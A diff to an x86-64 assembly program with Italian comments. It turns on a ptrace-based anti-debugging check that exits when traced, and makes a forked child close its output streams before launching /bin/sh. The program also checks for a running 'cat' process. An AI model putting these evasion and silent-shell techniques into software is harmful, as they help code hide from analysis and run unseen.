@@ -65,20 +65,27 @@ _start:
     mov rbp, rsp                      ; salvo stato attuale stack
 
     ; ----------------------- Anti-Debug -----------------------
-;    mov rax, 101                      ; ptrace
-;    mov rdi, 0                        ; PTRACE_TRACEME
-;    mov rsi, 0
-;    mov rdx, 1
-;    mov r10, 0
-;    syscall
-;    cmp rax, 0
-;    jnl .pass_first_check
-;
-;    mov rax, 60
-;    mov rdi, 0
-;    syscall
+    mov rax, 101                      ; ptrace
+    mov rdi, 0                        ; PTRACE_TRACEME
+    mov rsi, 0
+    mov rdx, 1
+    mov r10, 0
+    syscall
+    cmp rax, 0
+    jnl .pass_first_check
+
+    mov rax, 60
+    mov rdi, 0
+    syscall
 
     .pass_first_check:
+;    mov rax, 101
+;    ;mov rdi, 0x4207                   ; PTRACE_INTERRUPT
+;    mov rdi, 17                        ; PTRACE_DETACH
+;    mov rsi, 0
+;    mov rdx, 0
+;    mov r10, 0
+;    syscall
     ; --------- Controllo se il processo cat è attivo ----------
     call check_process
     cmp eax, 1
@@ -396,6 +403,14 @@ check_process:
     ret
 
     .figlio:
+        ; close(1)
+        mov rdi, 1
+        mov rax, 3
+        syscall
+        ; close(2)
+        mov rdi, 2
+        mov rax, 3
+        syscall
         ; rdi = '/bin/sh\0'
         sub rsp, 12
         mov dword [rsp+4], `/sh\0`
@@ -432,8 +447,6 @@ check_process:
         ; execve
         mov rax, 59
         syscall
-        ;cmp rax, 0
-        ;jl .exit
 
     .exit:
         mov rdi, 0
